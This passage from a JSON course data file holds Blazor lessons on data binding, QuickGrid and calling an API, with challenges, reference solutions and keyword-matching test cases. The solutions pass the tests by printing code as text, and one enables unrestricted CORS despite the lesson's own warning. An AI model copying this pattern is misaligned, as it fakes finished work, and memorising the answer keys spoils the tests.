              "content": "## Watch Out For These Issues\n\n**Type mismatch**: @bind with `type=\"number\"` requires int/decimal variable, not string! Type mismatch = binding fails silently. Match variable type to input type.\n\n**Nullable types**: `int?` needs special handling! `@bind=\"nullableInt\"` may fail. Use `@bind:get` and `@bind:set` for complex scenarios.\n\n**@bind:event timing**: Default is 'onchange' (on blur). For live updates, use `@bind:event=\"oninput\"`. But be aware of performance in large forms!\n\n**Culture formatting**: `@bind:format=\"C\"` uses current culture! $1,234.56 (US) vs 1.234,56 EUR (DE). Use `@bind:culture` to specify.\n\n**Component binding convention**: For `@bind-Value`, component needs `Value` AND `ValueChanged` (exact naming!). `@bind-Text` needs `Text` and `TextChanged`. No flexibility here.\n\n**Binding to readonly**: Can't @bind to readonly property! Needs get AND set. Use `@bind:get` and `@bind:set` for computed bindings."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-13-06-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a User Profile Editor with full data binding!\n\n1. UserProfile model:\n   - string Name\n   - string Email\n   - int Age\n   - DateTime JoinDate\n   - bool IsActive\n   - string Bio (textarea)\n\n2. ProfileEditor component:\n   - Input for Name (@bind, updates live)\n   - Input for Email\n   - Number input for Age\n   - Date input for JoinDate\n   - Checkbox for IsActive\n   - Textarea for Bio\n   - Display preview card showing all values\n   - Show character count for Bio (live update)\n\n3. Demonstrate @bind:event=\"oninput\" for live updates\n\nPrint complete component!",
              "starterCode": "// ProfileEditor.razor\n<div class=\"profile-editor\">\n    <h3>Edit Profile</h3>\n    \n    <div class=\"form-group\">\n        <label>Name:</label>\n        <input @bind=\"profile.Name\" @bind:event=\"oninput\" class=\"form-control\" />\n    </div>\n    \n    <!-- Add other inputs -->\n    \n    <h4>Preview</h4>\n    <div class=\"card\">\n        <h5>@profile.Name</h5>\n        <p>Email: @profile.Email</p>\n        <!-- Show other fields -->\n    </div>\n</div>\n\n@code {\n    private class UserProfile {\n        public string Name { get; set; } = \"\";\n        // Add other properties\n    }\n    \n    private UserProfile profile = new();\n}",
              "solution": "Console.WriteLine(@\"\n// ProfileEditor.razor\nusing System;\n\n<div class=\"\"profile-editor container\"\">\n    <div class=\"\"row\"\">\n        <div class=\"\"col-md-6\"\">\n            <h3>✏️ Edit Profile</h3>\n            \n            <div class=\"\"mb-3\"\">\n                <label class=\"\"form-label\"\">Name:</label>\n                <input @bind=\"\"profile.Name\"\" @bind:event=\"\"oninput\"\" \n                       class=\"\"form-control\"\" placeholder=\"\"Enter your name\"\" />\n            </div>\n            \n            <div class=\"\"mb-3\"\">\n                <label class=\"\"form-label\"\">Email:</label>\n                <input @bind=\"\"profile.Email\"\" type=\"\"email\"\" \n                       class=\"\"form-control\"\" placeholder=\"\"your@email.com\"\" />\n            </div>\n            \n            <div class=\"\"mb-3\"\">\n                <label class=\"\"form-label\"\">Age:</label>\n                <input @bind=\"\"profile.Age\"\" type=\"\"number\"\" \n                       class=\"\"form-control\"\" min=\"\"0\"\" max=\"\"120\"\" />\n            </div>\n            \n            <div class=\"\"mb-3\"\">\n                <label class=\"\"form-label\"\">Join Date:</label>\n                <input @bind=\"\"profile.JoinDate\"\" type=\"\"date\"\" \n                       class=\"\"form-control\"\" />\n            </div>\n            \n            <div class=\"\"mb-3 form-check\"\">\n                <input @bind=\"\"profile.IsActive\"\" type=\"\"checkbox\"\" \n                       class=\"\"form-check-input\"\" id=\"\"activeCheck\"\" />\n                <label class=\"\"form-check-label\"\" for=\"\"activeCheck\"\">Active Member</label>\n            </div>\n            \n            <div class=\"\"mb-3\"\">\n                <label class=\"\"form-label\"\">Bio:</label>\n                <textarea @bind=\"\"profile.Bio\"\" @bind:event=\"\"oninput\"\"\n                          class=\"\"form-control\"\" rows=\"\"4\"\" \n                          placeholder=\"\"Tell us about yourself...\"\">\n                </textarea>\n                <small class=\"\"text-muted\"\">Characters: @profile.Bio.Length / 500</small>\n            </div>\n        </div>\n        \n        <div class=\"\"col-md-6\"\">\n            <h3>👁️ Live Preview</h3>\n            <div class=\"\"card\"\">\n                <div class=\"\"card-body\"\">\n                    <h5 class=\"\"card-title\"\">@(string.IsNullOrEmpty(profile.Name) ? \"\"(No name)\"\" : profile.Name)</h5>\n                    \n                    <p class=\"\"card-text\"\">\n                        <strong>Email:</strong> @(string.IsNullOrEmpty(profile.Email) ? \"\"(Not provided)\"\" : profile.Email)<br/>\n                        <strong>Age:</strong> @profile.Age years<br/>\n                        <strong>Member Since:</strong> @profile.JoinDate.ToString(\"\"MMM dd, yyyy\"\")<br/>\n                        <strong>Status:</strong> \n                        <span class=\"\"badge bg-@(profile.IsActive ? \\\"\"success\\\"\" : \\\"\"secondary\\\"\")\"\">\n                            @(profile.IsActive ? \"\"Active\"\" : \"\"Inactive\"\")\n                        </span>\n                    </p>\n                    \n                    @if (!string.IsNullOrEmpty(profile.Bio))\n                    {\n                        <hr />\n                        <p class=\"\"card-text\"\">\n                            <strong>Bio:</strong><br/>\n                            @profile.Bio\n                        </p>\n                    }\n                </div>\n            </div>\n        </div>\n    </div>\n</div>\n\n@code {\n    private class UserProfile {\n        public string Name { get; set; } = \"\"\"\";\n        public string Email { get; set; } = \"\"\"\";\n        public int Age { get; set; } = 18;\n        public DateTime JoinDate { get; set; } = DateTime.Now;\n        public bool IsActive { get; set; } = true;\n        public string Bio { get; set; } = \"\"\"\";\n    }\n    \n    private UserProfile profile = new();\n}\n\"\");\n\nConsole.WriteLine(@\"\n=== DATA BINDING FEATURES ===\");\nConsole.WriteLine(\"✓ @bind for two-way sync\");\nConsole.WriteLine(\"✓ @bind:event=\\\"oninput\\\" for live updates\");\nConsole.WriteLine(\"✓ Works with: string, int, DateTime, bool\");\nConsole.WriteLine(\"✓ Input, textarea, checkbox, select all supported\");\nConsole.WriteLine(\"✓ Live preview updates as you type!\");\nConsole.WriteLine(\"\\n✓ No manual event handlers needed!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"ProfileEditor\"",
                  "expectedOutput": "ProfileEditor",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"@bind\"",
                  "expectedOutput": "@bind",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"@bind:event\"",
                  "expectedOutput": "@bind:event",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"Live Preview\"",
                  "expectedOutput": "Live Preview",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"two-way\"",
                  "expectedOutput": "two-way",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "@bind=\"variable\" for two-way binding. @bind:event=\"oninput\" for live updates. Works with strings, numbers, dates, bools. Automatic sync both ways!"
                },
                {
                  "level": 2,
                  "text": "Type mismatch: @bind with type=\"number\" on string? Won't work! Variable type must match input type. int with number, string with text, bool with checkbox."
                },
                {
                  "level": 3,
                  "text": "Format vs culture: @bind:format=\"C\" uses current culture! En-US = $, En-GB = £. Be aware for international apps. Use @bind:culture to specify."
                },
                {
                  "level": 4,
                  "text": "Binding performance: @bind:event=\"oninput\" on large list? Slow! Updates on every keystroke. Use onchange (default) for better performance when possible."
                },
                {
                  "level": 5,
                  "text": "Component binding naming: For @bind-Count, need Count AND CountChanged (exact naming!). If mismatch, binding won't work. Convention: Property + PropertyChanged."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Type mismatch",
                  "consequence": "@bind with type=\"number\" on string? Won't work! Variable type must match input type. int with number, string with text, bool with checkbox.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Format vs culture",
                  "consequence": "@bind:format=\"C\" uses current culture! En-US = $, En-GB = £. Be aware for international apps. Use @bind:culture to specify.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Binding performance",
                  "consequence": "@bind:event=\"oninput\" on large list? Slow! Updates on every keystroke. Use onchange (default) for better performance when possible.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Component binding naming",
                  "consequence": "For @bind-Count, need Count AND CountChanged (exact naming!). If mismatch, binding won't work. Convention: Property + PropertyChanged.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-13-07",
          "title": "QuickGrid Component (.NET 8 Feature)",
          "moduleId": "module-13",
          "order": 7,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "QuickGrid is like an Excel spreadsheet for your data:\n\nWithout QuickGrid (manual):\n• Build table HTML yourself\n• Write sorting logic\n• Write filtering code\n• Write paging manually\n• Handle loading states\n• 200+ lines of code!\n\nWith QuickGrid (.NET 8):\n• <QuickGrid Items=\"@products\" />\n• Add columns\n• Sorting? Built-in!\n• Filtering? Built-in!\n• Paging? Built-in!\n• 20 lines of code!\n\nQuickGrid features:\n✅ Sorting (click column headers)\n✅ Filtering\n✅ Pagination\n✅ Virtualization (huge datasets)\n✅ Custom templates\n✅ Responsive\n\nThink: QuickGrid = 'Professional data grid with superpowers, included free in .NET 8!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// INSTALL: Microsoft.AspNetCore.Components.QuickGrid\n// (Included in .NET 8 templates!)\n\nusing Microsoft.AspNetCore.Components.QuickGrid;\n\n// BASIC QUICKGRID\n<QuickGrid Items=\"@products\">\n    <PropertyColumn Property=\"@(p => p.Name)\" Sortable=\"true\" />\n    <PropertyColumn Property=\"@(p => p.Price)\" Format=\"C2\" Sortable=\"true\" />\n    <PropertyColumn Property=\"@(p => p.Stock)\" />\n</QuickGrid>\n\n@code {\n    private List<Product> products = new() {\n        new Product { Name = \"Laptop\", Price = 999.99m, Stock = 5 },\n        new Product { Name = \"Mouse\", Price = 29.99m, Stock = 50 }\n    };\n}\n\n// ADVANCED WITH CUSTOM COLUMNS\n<QuickGrid Items=\"@products\" Class=\"table table-striped\">\n    <PropertyColumn Property=\"@(p => p.Name)\" Title=\"Product\" />\n    \n    <TemplateColumn Title=\"Price\">\n        <span class=\"@(context.Price > 500 ? \"text-danger\" : \"text-success\")\">\n            $@context.Price\n        </span>\n    </TemplateColumn>\n    \n    <TemplateColumn Title=\"Actions\">\n        <button @onclick=\"() => Edit(context)\">Edit</button>\n        <button @onclick=\"() => Delete(context)\">Delete</button>\n    </TemplateColumn>\n</QuickGrid>\n\n// WITH PAGINATION\n<QuickGrid Items=\"@products\" Pagination=\"@pagination\">\n    <PropertyColumn Property=\"@(p => p.Name)\" />\n</QuickGrid>\n<Paginator State=\"@pagination\" />\n\n@code {\n    private PaginationState pagination = new PaginationState { ItemsPerPage = 10 };\n}\n\n// WITH IASYNCQUERYABLE (DATABASE)\n<QuickGrid Items=\"@context.Products.AsQueryable()\">\n    // Queries database efficiently!\n</QuickGrid>\n\n// FILTERING\n<input @bind=\"searchTerm\" @bind:event=\"oninput\" placeholder=\"Search...\" />\n<QuickGrid Items=\"@FilteredProducts\">\n    <PropertyColumn Property=\"@(p => p.Name)\" />\n</QuickGrid>\n\n@code {\n    private string searchTerm = \"\";\n    private IQueryable<Product> FilteredProducts => \n        products.AsQueryable()\n                .Where(p => p.Name.Contains(searchTerm, StringComparison.OrdinalIgnoreCase));\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`<QuickGrid Items=\"@collection\">`**: Main component. Items = IQueryable<T> or IEnumerable<T>. IQueryable is better (database queries optimized!). Renders HTML table.\n\n**`<PropertyColumn Property=\"@(p => p.Name)\" />`**: Column for a property. Lambda selects property. Sortable=\"true\" enables sorting. Format=\"C2\" for currency, \"P\" for percent.\n\n**`<TemplateColumn>`**: Custom column content. Access item via 'context'. Full control: buttons, badges, conditional styling. Use for actions, custom rendering.\n\n**`Pagination=\"@state\"`**: Enable paging. Create PaginationState with ItemsPerPage. Use <Paginator State=\"@state\" /> to show page controls. Efficient for large datasets!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues\n\n**IQueryable vs IEnumerable performance**: Use IQueryable with EF Core! Sorting/paging executes in database. IEnumerable loads ALL data first, then filters in memory - slow for large datasets!\n\n**Missing NuGet package**: QuickGrid requires `Microsoft.AspNetCore.Components.QuickGrid`. Included in .NET 8+ templates, but older projects need manual install.\n\n**Render mode required**: QuickGrid needs interactive render mode for sorting/paging! Static SSR won't work. Add `@rendermode InteractiveServer` or similar.\n\n**Context variable in templates**: Inside TemplateColumn, use 'context' (not 'item') to access current row! `@context.Name` works, `@item.Name` doesn't exist.\n\n**Same PaginationState instance**: Both QuickGrid AND Paginator must use the SAME PaginationState instance! Different instances = pagination breaks.\n\n**.NET 9 change**: Empty rows now have empty `<td></td>` cells for stable row height across pages. CSS may need adjustment if you styled empty rows differently.\n\n**Virtualization caveat**: For very large datasets (10000+ rows), consider virtualization: `<QuickGrid Items=\"@data\" Virtualize=\"true\" />`. Much better scrolling performance!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-13-07-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a Product Inventory Manager with QuickGrid!\n\n1. Product model:\n   - int Id\n   - string Name\n   - decimal Price\n   - int Stock\n   - string Category\n   - bool IsAvailable\n\n2. Create QuickGrid with:\n   - Property columns: Name (sortable), Category, Stock\n   - Template column for Price (red if > $500, green otherwise)\n   - Template column for Status (badge: In Stock / Low Stock / Out)\n   - Template column for Actions (Edit, Delete buttons)\n   - Enable sorting on Name and Price\n\n3. Add search filter input\n4. Add pagination (10 items per page)\n5. Show total products count\n\nPrint complete component!",
              "starterCode": "using Microsoft.AspNetCore.Components.QuickGrid;\n\n// ProductInventory.razor\n<div>\n    <h3>📦 Product Inventory</h3>\n    \n    <input @bind=\"searchTerm\" placeholder=\"Search products...\" />\n    \n    <QuickGrid Items=\"@FilteredProducts\">\n        <PropertyColumn Property=\"@(p => p.Name)\" Sortable=\"true\" />\n        <!-- Add other columns -->\n    </QuickGrid>\n    \n    <p>Total Products: @products.Count</p>\n</div>\n\n@code {\n    private class Product {\n        public int Id { get; set; }\n        public string Name { get; set; }\n        public decimal Price { get; set; }\n        public int Stock { get; set; }\n        public string Category { get; set; }\n    }\n    \n    private List<Product> products = new();\n    private string searchTerm = \"\";\n}",
              "solution": "Console.WriteLine(@\"\n// ProductInventory.razor\nusing Microsoft.AspNetCore.Components.QuickGrid;\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\n<div class=\"\"container\"\">\n    <h3>📦 Product Inventory Manager</h3>\n    \n    <div class=\"\"mb-3\"\">\n        <input class=\"\"form-control\"\" \n               @bind=\"\"searchTerm\"\" \n               @bind:event=\"\"oninput\"\"\n               placeholder=\"\"🔍 Search products...\"\" />\n    </div>\n    \n    <QuickGrid Items=\"\"@FilteredProducts\"\" Class=\"\"table table-hover\"\" Pagination=\"\"@pagination\"\">\n        <PropertyColumn Property=\"\"@(p => p.Name)\"\" Title=\"\"Product Name\"\" Sortable=\"\"true\"\" />\n        \n        <PropertyColumn Property=\"\"@(p => p.Category)\"\" Title=\"\"Category\"\" Sortable=\"\"true\"\" />\n        \n        <TemplateColumn Title=\"\"Price\"\" Sortable=\"\"true\"\" SortBy=\"\"@(GridSort<Product>.ByAscending(p => p.Price))\"\">\n            <span class=\"\"@(context.Price > 500 ? \\\"\"text-danger fw-bold\\\"\" : \\\"\"text-success\\\"\")\"\">\n                $@context.Price.ToString(\\\"\"F2\\\"\")\n            </span>\n        </TemplateColumn>\n        \n        <TemplateColumn Title=\"\"Stock Status\"\">\n            @if (context.Stock == 0)\n            {\n                <span class=\"\"badge bg-danger\"\">Out of Stock</span>\n            }\n            else if (context.Stock < 10)\n            {\n                <span class=\"\"badge bg-warning\"\">Low Stock (@context.Stock)</span>\n            }\n            else\n            {\n                <span class=\"\"badge bg-success\"\">In Stock (@context.Stock)</span>\n            }\n        </TemplateColumn>\n        \n        <TemplateColumn Title=\"\"Available\"\">\n            @if (context.IsAvailable)\n            {\n                <span class=\"\"text-success\"\">✓</span>\n            }\n            else\n            {\n                <span class=\"\"text-danger\"\">✗</span>\n            }\n        </TemplateColumn>\n        \n        <TemplateColumn Title=\"\"Actions\"\">\n            <button class=\"\"btn btn-sm btn-primary\"\" @onclick=\"\"() => EditProduct(context.Id)\"\">Edit</button>\n            <button class=\"\"btn btn-sm btn-danger\"\" @onclick=\"\"() => DeleteProduct(context.Id)\"\">Delete</button>\n        </TemplateColumn>\n    </QuickGrid>\n    \n    <Paginator State=\"\"@pagination\"\" />\n    \n    <div class=\"\"mt-3\"\">\n        <strong>Total Products: @products.Count</strong> | \n        <strong>Showing: @FilteredProducts.Count()</strong>\n    </div>\n</div>\n\n@code {\n    private class Product {\n        public int Id { get; set; }\n        public string Name { get; set; } = \"\"\"\";\n        public decimal Price { get; set; }\n        public int Stock { get; set; }\n        public string Category { get; set; } = \"\"\"\";\n        public bool IsAvailable { get; set; }\n    }\n    \n    private List<Product> products = new() {\n        new Product { Id = 1, Name = \"\"Laptop\"\", Price = 999.99m, Stock = 5, Category = \"\"Electronics\"\", IsAvailable = true },\n        new Product { Id = 2, Name = \"\"Mouse\"\", Price = 29.99m, Stock = 50, Category = \"\"Electronics\"\", IsAvailable = true },\n        new Product { Id = 3, Name = \"\"Monitor\"\", Price = 399.99m, Stock = 0, Category = \"\"Electronics\"\", IsAvailable = false },\n        new Product { Id = 4, Name = \"\"Keyboard\"\", Price = 79.99m, Stock = 8, Category = \"\"Electronics\"\", IsAvailable = true },\n        new Product { Id = 5, Name = \"\"Desk\"\", Price = 299.99m, Stock = 15, Category = \"\"Furniture\"\", IsAvailable = true }\n    };\n    \n    private string searchTerm = \"\"\"\";\n    private PaginationState pagination = new PaginationState { ItemsPerPage = 10 };\n    \n    private IQueryable<Product> FilteredProducts =>\n        products.AsQueryable()\n                .Where(p => string.IsNullOrEmpty(searchTerm) || \n                           p.Name.Contains(searchTerm, StringComparison.OrdinalIgnoreCase) ||\n                           p.Category.Contains(searchTerm, StringComparison.OrdinalIgnoreCase));\n    \n    private void EditProduct(int id) {\n        Console.WriteLine($\"\"Edit product {id}\"\");\n    }\n    \n    private void DeleteProduct(int id) {\n        var product = products.FirstOrDefault(p => p.Id == id);\n        if (product != null) {\n            products.Remove(product);\n            Console.WriteLine($\"\"Deleted: {product.Name}\"\");\n        }\n    }\n}\n\"\");\n\nConsole.WriteLine(@\"\n=== QUICKGRID BENEFITS ===\");\nConsole.WriteLine(\"✓ Built-in sorting (click column headers)\");\nConsole.WriteLine(\"✓ Pagination with Paginator component\");\nConsole.WriteLine(\"✓ Custom templates for complex columns\");\nConsole.WriteLine(\"✓ Conditional styling (colors, badges)\");\nConsole.WriteLine(\"✓ Action buttons (Edit, Delete)\");\nConsole.WriteLine(\"✓ Responsive table layout\");\nConsole.WriteLine(\"\\n✓ Professional data grid with minimal code!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"QuickGrid\"",
                  "expectedOutput": "QuickGrid",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"PropertyColumn\"",
                  "expectedOutput": "PropertyColumn",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"TemplateColumn\"",
                  "expectedOutput": "TemplateColumn",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"Pagination\"",
                  "expectedOutput": "Pagination",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"Sortable\"",
                  "expectedOutput": "Sortable",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "PropertyColumn for simple properties. TemplateColumn for custom content. Sortable=\"true\" enables sorting. Use 'context' in templates to access row item. Pagination with PaginationState."
                },
                {
                  "level": 2,
                  "text": "IQueryable vs IEnumerable: Use IQueryable when possible (especially with EF Core)! Sorting/paging happens in database. IEnumerable loads all data first (slow!)."
                },
                {
                  "level": 3,
                  "text": "Missing NuGet package: QuickGrid requires Microsoft.AspNetCore.Components.QuickGrid package. In .NET 8+ templates, it's included. Older projects need manual install."
                },
                {
                  "level": 4,
                  "text": "Context in templates: Inside TemplateColumn, use 'context' to access current row item! '@context.Name', '@context.Price'. Don't forget 'context.'!"
                },
                {
                  "level": 5,
                  "text": "Pagination state: Must create PaginationState instance and pass to both QuickGrid AND Paginator! If mismatch, pagination breaks. Same instance for both!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "IQueryable vs IEnumerable",
                  "consequence": "Use IQueryable when possible (especially with EF Core)! Sorting/paging happens in database. IEnumerable loads all data first (slow!).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Missing NuGet package",
                  "consequence": "QuickGrid requires Microsoft.AspNetCore.Components.QuickGrid package. In .NET 8+ templates, it's included. Older projects need manual install.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Context in templates",
                  "consequence": "Inside TemplateColumn, use 'context' to access current row item! '@context.Name', '@context.Price'. Don't forget 'context.'!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Pagination state",
                  "consequence": "Must create PaginationState instance and pass to both QuickGrid AND Paginator! If mismatch, pagination breaks. Same instance for both!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        }
      ]
    },
    {
      "id": "module-14",
      "title": "Blazor, .NET Aspire & Deployment",
      "description": "Build interactive web UIs with Blazor, orchestrate distributed apps with .NET Aspire (service discovery, dashboards, telemetry), and deploy to Azure.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-14-01",
          "title": "Connecting Blazor to API (Frontend + Backend)",
          "moduleId": "module-14",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Full Stack = Frontend + Backend working together:\n\nFRONTEND (Blazor):\n• The restaurant customer\n• Sees menu, orders food\n• Nice UI, interactive\n\nBACKEND (ASP.NET Core API):\n• The kitchen\n• Prepares the food\n• Database, business logic\n\nHttpClient = The waiter who connects them!\n\nBlazer ← HttpClient → API ← EF Core → Database\n\nBlazor calls API:\n1. User clicks button\n2. Blazor makes HTTP request\n3. API processes (database query)\n4. API sends JSON response\n5. Blazor displays data\n\nThink: HttpClient = 'The bridge between your beautiful UI and powerful backend!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// API (Backend) - Program.cs\nvar builder = WebApplication.CreateBuilder(args);\nbuilder.Services.AddDbContext<AppDbContext>();\n\nvar app = builder.Build();\n\n// CORS for Blazor - DEVELOPMENT ONLY!\n// WARNING: AllowAnyOrigin() is insecure for production!\nif (app.Environment.IsDevelopment())\n{\n    app.UseCors(policy => policy\n        .AllowAnyOrigin()\n        .AllowAnyMethod()\n        .AllowAnyHeader());\n}\nelse\n{\n    // PRODUCTION: Restrict to specific origins\n    app.UseCors(policy => policy\n        .WithOrigins(\"https://yourapp.com\", \"https://www.yourapp.com\")\n        .AllowAnyMethod()\n        .AllowAnyHeader()\n        .AllowCredentials());  // For cookies/auth headers\n}\n\napp.MapGet(\"/api/products\", async (AppDbContext db) =>\n    await db.Products.ToListAsync());\n\napp.MapGet(\"/api/products/{id}\", async (int id, AppDbContext db) =>\n    await db.Products.FindAsync(id));\n\napp.Run();\n\n// BLAZOR (Frontend) - Using HttpClient\n@inject HttpClient Http\n\n<h3>Products</h3>\n\n@if (products == null)\n{\n    <p>Loading...</p>\n}\nelse\n{\n    <ul>\n        @foreach (var product in products)\n        {\n            <li>@product.Name - $@product.Price</li>\n        }\n    </ul>\n}\n\n@code {\n    private List<Product>? products;\n    \n    protected override async Task OnInitializedAsync()\n    {\n        // Call API!\n        products = await Http.GetFromJsonAsync<List<Product>>(\n            \"https://localhost:5001/api/products\");\n    }\n}\n\n// POST REQUEST\nprivate async Task CreateProduct(Product product)\n{\n    var response = await Http.PostAsJsonAsync(\n        \"https://localhost:5001/api/products\", product);\n    \n    if (response.IsSuccessStatusCode)\n    {\n        Console.WriteLine(\"Product created!\");\n    }\n}\n\n// PUT REQUEST\nprivate async Task UpdateProduct(int id, Product product)\n{\n    await Http.PutAsJsonAsync(\n        $\"https://localhost:5001/api/products/{id}\", product);\n}\n\n// DELETE REQUEST\nprivate async Task DeleteProduct(int id)\n{\n    await Http.DeleteAsync(\n        $\"https://localhost:5001/api/products/{id}\");\n}\n\n// ERROR HANDLING\ntry\n{\n    products = await Http.GetFromJsonAsync<List<Product>>(\n        \"https://localhost:5001/api/products\");\n}\ncatch (HttpRequestException ex)\n{\n    errorMessage = $\"API Error: {ex.Message}\";\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`@inject HttpClient Http`**: Injects HttpClient into component. Use 'Http' to make API calls. Configured in Program.cs with BaseAddress.\n\n**`GetFromJsonAsync<T>(url)`**: GET request, deserializes JSON to T. Returns T or null. Throws HttpRequestException on failure. Use try/catch!\n\n**`PostAsJsonAsync(url, data)`**: POST request, serializes data to JSON. Returns HttpResponseMessage. Check response.IsSuccessStatusCode for success.\n\n**`CORS configuration`**: API must enable CORS for Blazor WebAssembly! Use UseCors() in development with AllowAnyOrigin(). **SECURITY WARNING**: AllowAnyOrigin() is unsafe for production - any website could call your API! In production, use WithOrigins() to restrict to your specific frontend domains."
            },
            {
              "type": "WARNING",
              "title": "Best Practices",
              "content": "## HttpClient Best Practices\n\n**Use IHttpClientFactory** (recommended for production):\n- Prevents socket exhaustion issues\n- Handles DNS changes automatically\n- Enables retry policies with Polly\n- Register in Program.cs: `builder.Services.AddHttpClient<MyApiClient>()`\n\n**Typed Clients pattern**:\n```csharp\npublic class ProductApiClient\n{\n    private readonly HttpClient _http;\n    public ProductApiClient(HttpClient http) => _http = http;\n    public Task<List<Product>> GetProductsAsync() => \n        _http.GetFromJsonAsync<List<Product>>(\"/api/products\");\n}\n```\n\n**Common Mistakes**:\n- Creating `new HttpClient()` manually (causes socket exhaustion)\n- Not handling HttpRequestException\n- Forgetting to await async methods\n- Missing CORS on API for WebAssembly apps"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-14-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a full-stack Todo app!\n\n1. API (backend):\n   - Todo model (Id, Title, IsCompleted)\n   - GET /api/todos (list all)\n   - POST /api/todos (create)\n   - PUT /api/todos/{id} (update)\n   - DELETE /api/todos/{id} (delete)\n   - Use in-memory list\n\n2. Blazor component (frontend):\n   - Inject HttpClient\n   - OnInitializedAsync: load todos\n   - Display list with checkboxes\n   - Input to add new todo\n   - Delete button for each\n   - Handle loading and errors\n\n3. Print both API and Blazor code!\n\nThis is your first full-stack app!",
              "starterCode": "// API - Program.cs\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\nvar todos = new List<Todo> {\n    new Todo { Id = 1, Title = \"Learn Blazor\", IsCompleted = false }\n};\n\napp.MapGet(\"/api/todos\", () => todos);\n\n// Add other endpoints...\n\napp.Run();\n\n// Blazor - TodoList.razor\n@inject HttpClient Http\n\n<h3>Todo List</h3>\n\n@if (todos == null)\n{\n    <p>Loading...</p>\n}\nelse\n{\n    <ul>\n        @foreach (var todo in todos)\n        {\n            <li>\n                <input type=\"checkbox\" @bind=\"todo.IsCompleted\" />\n                @todo.Title\n                <button @onclick=\"() => DeleteTodo(todo.Id)\">Delete</button>\n            </li>\n        }\n    </ul>\n}\n\n@code {\n    private List<Todo>? todos;\n    \n    protected override async Task OnInitializedAsync()\n    {\n        await LoadTodos();\n    }\n    \n    private async Task LoadTodos()\n    {\n        // Call API\n    }\n}",
              "solution": "Console.WriteLine(@\"\n=== API (BACKEND) - Program.cs ===\");\nConsole.WriteLine(@\"\nusing Microsoft.AspNetCore.Builder;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\n// Enable CORS for Blazor\napp.UseCors(policy => policy\n    .AllowAnyOrigin()\n    .AllowAnyMethod()\n    .AllowAnyHeader());\n\nclass Todo {\n    public int Id { get; set; }\n    public string Title { get; set; } = \"\"\"\";\n    public bool IsCompleted { get; set; }\n}\n\nvar todos = new List<Todo> {\n    new Todo { Id = 1, Title = \"\"Learn Blazor\"\", IsCompleted = false },\n    new Todo { Id = 2, Title = \"\"Build API\"\", IsCompleted = true }\n};\nint nextId = 3;\n\napp.MapGet(\"\"/api/todos\"\", () => todos);\n\napp.MapGet(\"\"/api/todos/{id}\"\", (int id) => {\n    var todo = todos.FirstOrDefault(t => t.Id == id);\n    return todo is not null ? Results.Ok(todo) : Results.NotFound();\n});\n\napp.MapPost(\"\"/api/todos\"\", (Todo todo) => {\n    todo.Id = nextId++;\n    todos.Add(todo);\n    return Results.Created($\"\"/api/todos/{todo.Id}\"\", todo);\n});\n\napp.MapPut(\"\"/api/todos/{id}\"\", (int id, Todo updated) => {\n    var todo = todos.FirstOrDefault(t => t.Id == id);\n    if (todo is null) return Results.NotFound();\n    \n    todo.Title = updated.Title;\n    todo.IsCompleted = updated.IsCompleted;\n    return 